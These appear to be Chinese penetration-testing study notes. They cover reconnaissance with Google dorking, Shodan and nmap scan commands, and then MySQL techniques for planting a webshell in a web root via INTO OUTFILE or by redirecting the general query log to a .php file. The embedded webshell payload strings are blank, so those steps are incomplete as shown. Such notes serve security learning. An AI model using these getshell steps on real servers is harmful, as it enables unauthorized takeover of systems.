# 基础

### 1. 信息收集

信息收集是渗透测试的第一步，旨在尽可能多地了解目标系统。

#### **网络与域名侦察**

* **Google Hacking:** 利用 Google 的高级搜索语法（如 `site:`, `filetype:`, `inurl:`）来发现目标网站的敏感信息、目录列表和备份文件。
* **子域名枚举:** 查找目标域名的所有子域名，这可以帮助你发现被遗忘或保护较差的服务器。
* **Shodan:** 一个强大的搜索引擎，用于查找暴露在互联网上的设备和服务，可以帮助你发现开放的端口和潜在的物联网漏洞。
* **DNS 信息:** 查询目标的 DNS 记录（如 `A`、`MX`、`NS`），可以了解目标的基础设施配置。

***

#### **主机与端口扫描**

* **Nmap:** 功能强大的网络扫描工具。
 * `nmap -sP 192.168.145.*`: `Ping Scan`（新版本用`-sn`）快速扫描指定网段，识别存活的主机。
 * `nmap -sS -sV -Pn 192.168.145.135`: 对特定主机进行详细扫描。
 * `-sS`: 使用 TCP SYN 扫描，快速探测开放端口。需要`sudo`
 * `-sV`: 探测开放端口的服务及其版本。
 * `-Pn`: 跳过 Ping 探测主机发现，直接进行端口扫描，尤其适用于目标屏蔽了 Ping 请求的情况。
 * 全端口扫描 `sudo nmap -sS -p- -T4 -Pn 192.168.145.135`
 * `-p-` 扫描全端口
 * `-T4` 模板兼具准确性与速度
 * `nmap -p 22,80,443 -sV 10.129.26.40` 探测指定端口服务
 * `nmap -A -p6379 10.129.26.40` 作用同上，`-A` 激进模式
***

#### **Web 应用侦察**

* **WhatWeb / Wappalyzer:** 用于识别网站所使用的技术栈，包括 CMS、服务器、前端框架等。
* **Nikto:** Web 服务器扫描器，用于发现潜在的漏洞、错误配置和敏感文件。
* **DirBuster / GoBuster / FFuf:** 目录和文件爆破工具，用于发现网站中隐藏的路径、管理后台或备份文件。

### 2. SQL 注入与 Getshell

当你通过 SQL 注入获得了数据库权限后，下一步就是尝试获取服务器的控制权（Getshell）。

#### **常用 SQL 命令**

这些命令用于获取数据库和系统信息，为后续攻击做准备。

* 获取数据库版本：
 * `SELECT @@version;` (SQL Server)
 * `SELECT version();` (MySQL, PostgreSQL)
* 获取当前数据库用户：
 * `SELECT user();`
* 获取数据库安装路径：
 * `SELECT @@basedir;`

***

#### **方法一：通过 **`**into outfile**`** 导出木马**

这种方法需要数据库有文件写入权限。

* **命令:**`SELECT '' INTO OUTFILE 'c:\\phpStudy\\www\\xxx2.php';`
* **前提条件:**`**secure_file_priv**`\*\* 的值不能为 **`**NULL**`**。\*\*
 * 你可以通过 `SHOW GLOBAL VARIABLES LIKE '%secure%';` 来查看其值。
 * 如果值为 `NULL`，表示**禁止**文件导入导出。
 * 如果值为**空字符串 **`**""**`，表示**允许**在任意目录下写入文件。
 * 如果值为某个路径，则只能在该路径下写入。
 * 要修改此设置，需要在 MySQL 配置文件 `my.ini` 中，于 `[mysqld]` 部分加入 `secure_file_priv=""`，然后重启 MySQL 服务。

***

#### **方法二：利用 MySQL 日志写入木马**

这种方法通过修改 MySQL 的日志文件路径和开启日志功能，将恶意代码写入日志文件。

* **步骤:**
 1. **检查日志状态和路径:**`SHOW VARIABLES like '%general%';`
 2. **开启通用查询日志:**`SET GLOBAL general_log = 'ON';`
 3. **设置日志文件路径:**`SET GLOBAL general_log_file = 'c:\\phpStudy\\www\\log.php';`
 4. **执行恶意代码:**`SELECT "";` `SELECT ""`
 * 执行后，查询命令将被记录在 `log.php` 文件中，从而形成一个 Webshell。
